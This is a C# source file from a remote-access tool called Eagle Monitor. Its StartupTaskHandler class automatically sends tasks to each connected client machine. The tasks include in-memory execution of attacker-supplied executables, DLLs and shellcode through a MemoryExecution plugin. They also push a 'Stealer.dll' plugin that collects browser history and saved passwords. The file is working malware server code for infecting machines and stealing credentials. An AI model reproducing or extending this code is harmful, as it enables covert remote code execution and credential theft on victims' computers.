using Eagle_Monitor_Tasks_Configurator;
using EagleMonitor.Utils;
using PacketLib;
using PacketLib.Packet;
using StartupTask;
using System;
using System.Collections.Generic;
using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Networking
{
    internal class StartupTaskHandler
    {     
        internal static List<ITasks> allTask;
        internal static bool startupTaskExisting { get; set; }
        static StartupTaskHandler()
        {
            if (File.Exists(Miscellaneous.GPath + "\\startuptask.dat"))
            {
                startupTaskExisting = true;
                byte[] serialized = File.ReadAllBytes(Miscellaneous.GPath + "\\startuptask.dat");
                allTask = serialized.DeserializeTask();
                return;
            }
            startupTaskExisting = false;
        }

        private delegate void TaskWorker(ITasks task, ClientHandler client);
        private TaskWorker worker;

        internal StartupTaskHandler(ITasks task, ClientHandler client) 
        {
            worker = new TaskWorker(WorkerAsync);
            worker.BeginInvoke(task, client, new AsyncCallback(EndWorkerAsync), null);
        }

        private void WorkerAsync(ITasks task, ClientHandler client) 
        {
            switch (task.taskType) 
            {
                case TaskType.TT_PAYLOAD_EXE:
                    ExectionTasks exectionTasksExes = (ExectionTasks)task;
                    if (client.is64bitClient == exectionTasksExes.is64Bit)
                    {
                        if (exectionTasksExes.payloadType == ExectionTasks.PayloadType.NATIVE_EXE)
                        {
                            MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(exectionTasksExes.payloadPath), 1))
                            {
                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                            };
                            client.SendPacket(memoryExecutionPacket);
                        }
                        else 
                        {
                            MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(exectionTasksExes.payloadPath), 1))
                            {
                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                            };
                            client.SendPacket(memoryExecutionPacket);
                        }
                    }
                    break;

                case TaskType.TT_PAYLOAD_DLL:
                    ExectionTasks exectionTasksDLLs = (ExectionTasks)task;
                    if (client.is64bitClient == exectionTasksDLLs.is64Bit)
                    {
                        if (exectionTasksDLLs.payloadType == ExectionTasks.PayloadType.NATIVE_DLL)
                        {
                            MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(exectionTasksDLLs.payloadPath), 1))
                            {
                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                            };
                            client.SendPacket(memoryExecutionPacket);
                        }
                        else 
                        {
                            MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(exectionTasksDLLs.payloadPath), 1))
                            {
                                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1),
                                managedEntryPoint = exectionTasksDLLs.entryPointForManagedDlls
                            };
                            client.SendPacket(memoryExecutionPacket);
                        }
                    }
                    break;

                case TaskType.TT_PAYLOAD_SHELL:
                    ExectionTasks exectionTasksShellcode = (ExectionTasks)task;

                    if (client.is64bitClient == exectionTasksShellcode.is64Bit)
                    {
                        MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_SHELLCODE, Compressor.QuickLZ.Compress(File.ReadAllBytes(exectionTasksShellcode.payloadPath), 1))
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                        };
                        client.SendPacket(memoryExecutionPacket);
                    }
                    break;

                case TaskType.TT_HISTORY:
                    HistoryPacket historyPacket = new HistoryPacket
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                    };
                    client.SendPacket(historyPacket);
                    break;

                case TaskType.TT_PASSWORD:
                    PasswordsPacket passwordsPacket = new PasswordsPacket
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                    };
                    client.SendPacket(passwordsPacket);
                    break;
            }
        }

        private void EndWorkerAsync(IAsyncResult ar) 
        {
            worker.EndInvoke(ar);
        }
    }
}
